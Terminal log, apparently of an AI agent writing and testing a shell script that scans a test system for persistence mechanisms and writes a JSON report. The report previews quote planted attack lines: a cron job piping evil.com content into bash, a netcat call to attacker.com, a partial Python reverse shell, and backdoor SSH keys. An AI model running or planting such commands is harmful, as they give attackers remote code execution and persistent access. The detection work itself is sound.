+[?2004l[?2004h> mv -f "$TMP" "$OUT" 2>/dev/null
+[?2004l[?2004h> exit 0
+[?2004l[?2004h> EOF
+[?2004l[H[J[?2004hroot@0d5a608a53ec:/app# chmod +x /app/scan_persistence.sh && bash -n /app/scan_persistence.sh && echo 'script written'
+[?2004lscript written
+[?2004hroot@0d5a608a53ec:/app# /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; python3 -m json.tool /app/persistence_report.json >/dev/null && echo JSON_VALID; grep -E '"(type|path|content_preview)"' /app/persistence_report.json
+[?2004lexit=0
+a68da4e6cb8fbcf7ac25dd9fcd8328bb  /app/persistence_report.json
+exit=0
+a68da4e6cb8fbcf7ac25dd9fcd8328bb  /app/persistence_report.json
+JSON_VALID
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/app_target/etc/cron.d/app_cron",
+        [01;31m[K"content_preview"[m[K: "0 0 * * * root /app_target/scripts/evil.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+        [01;31m[K"content_preview"[m[K: "* * * * * root /tmp/malicious_cron.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+        [01;31m[K"content_preview"[m[K: "0 2 * * * user /usr/local/bin/suspicious_backup.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/var/spool/cron/crontabs/root",
+        [01;31m[K"content_preview"[m[K: "*/5 * * * * curl -s http://evil.com/payload.sh | bash",
+      [01;31m[K"type"[m[K: "rc_local",
+      [01;31m[K"path"[m[K: "/app_target/etc/rc.local",
+        [01;31m[K"content_preview"[m[K: "/tmp/startup_backdoor.sh &",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/app_target/home/victim/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8... attacker@unknown",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/app_target/etc/systemd/system/app_backdoor.service",
+        [01;31m[K"content_preview"[m[K: "ExecStart=/bin/sh -c 'echo \"backdoor\" | nc attacker.com 1234'",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/etc/systemd/system/persistence.service",
+        [01;31m[K"content_preview"[m[K: "ExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/usr/lib/systemd/system/.hidden_service.service",
+        [01;31m[K"content_preview"[m[K: "ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.co",
+[?2004hroot@0d5a608a53ec:/app# clear; ls -l /app/scan_persistence.sh /app/persistence_report.json; head -8 /app/persistence_report.json
+[?2004l[H[J-rw-r--r-- 1 root root 4558 Oct 26 01:33 /app/persistence_report.json
+-rwxr-xr-x 1 root root 6677 Oct 26 01:33 [0m[01;32m/app/scan_persistence.sh[0m
+{
+  "summary": {
+    "total_artifacts": 13,
+    "cron_jobs": 4,
+    "systemd_units": 3,
+    "rc_local_modifications": 1,
+    "ssh_keys": 5
+  },
+[?2004hroot@0d5a608a53ec:/app# 
